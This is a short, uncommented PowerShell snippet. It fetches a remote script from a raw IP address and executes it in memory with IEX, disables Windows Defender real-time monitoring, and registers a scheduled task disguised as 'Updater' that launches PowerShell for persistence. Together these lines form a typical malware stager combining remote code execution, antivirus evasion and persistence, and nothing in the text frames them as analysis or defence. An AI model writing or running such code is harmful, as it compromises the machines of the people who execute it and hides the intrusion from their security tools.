$url = "https://198.51.100.25/test.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)
Set-MpPreference -DisableRealtimeMonitoring $true
Register-ScheduledTask -TaskName "Updater" -Action (New-ScheduledTaskAction -Execute "powershell.exe")
